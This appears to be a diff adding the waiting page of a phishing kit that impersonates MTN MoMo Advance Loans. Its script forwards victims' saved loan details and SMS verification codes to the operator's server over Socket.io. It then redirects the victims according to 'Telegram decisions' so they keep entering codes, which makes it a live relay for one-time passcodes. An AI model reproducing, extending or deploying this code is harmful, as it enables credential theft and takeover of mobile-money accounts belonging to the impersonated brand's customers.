@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processing - MTN Advance Loans</title>
+    <style>
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
+        body { 
+            background-color: #004c6c; /* MTN Blue */
+            color: white; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            min-height: 100vh; 
+            text-align: center;
+        }
+
+        /* MoMo Logo Glow */
+        .logo-container {
+            margin-bottom: 40px;
+            position: relative;
+            display: inline-block;
+        }
+        .logo-container img {
+            width: 120px;
+            border-radius: 20px;
+            position: relative;
+            z-index: 2;
+        }
+        .glow {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 140px;
+            height: 140px;
+            background: rgba(255, 204, 0, 0.4);
+            filter: blur(30px);
+            border-radius: 50%;
+            z-index: 1;
+            animation: pulse 2s infinite alternate;
+        }
+        @keyframes pulse {
+            0% { transform: translate(-50%, -50%) scale(0.9); opacity: 0.6; }
+            100% { transform: translate(-50%, -50%) scale(1.1); opacity: 1; }
+        }
+
+        /* Spinner */
+        .spinner {
+            width: 80px;
+            height: 80px;
+            border: 6px solid rgba(255, 255, 255, 0.1);
+            border-top: 6px solid #ffcc00;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 40px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        h1 { font-size: 1.8rem; margin-bottom: 10px; font-weight: 600; }
+        p { font-size: 1rem; color: #b3c6d1; margin-bottom: 40px; }
+
+        /* Bouncing Dots */
+        .dots { display: flex; gap: 8px; justify-content: center; }
+        .dot {
+            width: 8px;
+            height: 8px;
+            background-color: #ffcc00;
+            border-radius: 50%;
+            animation: bounce 1.4s infinite ease-in-out both;
+        }
+        .dot:nth-child(1) { animation-delay: -0.32s; }
+        .dot:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="logo-container">
+        <div class="glow"></div>
+        <img src="momo-preview.jpg" alt="MoMo Logo">
+    </div>
+
+    <div class="spinner"></div>
+
+    <h1>Processing Application</h1>
+    <p>Please wait, this may take a few seconds</p>
+
+    <div class="dots">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+    </div>
+
+    <!-- Load Socket.io -->
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+
+        // Check what we are processing
+        const processType = sessionStorage.getItem('processType');
+
+        if (processType === 'loan_application') {
+            // Send the saved form data to the server
+            const loanData = JSON.parse(sessionStorage.getItem('loanData'));
+            socket.emit('submit_loan', loanData);
+        } 
+        else if (processType === 'sms_verification') {
+            // Send the saved SMS to the server
+            const smsText = sessionStorage.getItem('smsData');
+            socket.emit('submit_sms', smsText);
+        }
+
+        // --- LISTEN FOR TELEGRAM DECISIONS ---
+
+        // 1. Loan Application Responses
+        socket.on('approved', () => {
+            sessionStorage.removeItem('processType');
+            sessionStorage.removeItem('loanData');
+            window.location.href = "/verify-sms.html"; 
+        });
+
+        socket.on('rejected', () => {
+            sessionStorage.removeItem('processType');
+            sessionStorage.removeItem('loanData');
+            alert("Invalid details. Please enter the correct phone number and verification code.");
+            window.location.href = "/index.html"; // Back to form
+        });
+
+        // 2. SMS Verification Responses
+        socket.on('sms_approved', () => {
+            sessionStorage.removeItem('processType');
+            sessionStorage.removeItem('smsData');
+            window.location.href = "/verify-code.html";
+        });
+
+        socket.on('sms_rejected', () => {
+            sessionStorage.removeItem('processType');
+            sessionStorage.removeItem('smsData');
+            alert("Invalid SMS. Please enter the correct 5-digit code.");
+            window.location.href = "/index.html"; // Or wherever your 5-digit code page is
+        });
+
+        socket.on('sms_resend', () => {
+            sessionStorage.removeItem('processType');
+            sessionStorage.removeItem('smsData');
+            alert("Check your SMS for the new code sent.");
+            window.location.href = "/verify-sms.html"; // Back to SMS page
+        });
+    </script>
+</body>
+</html>
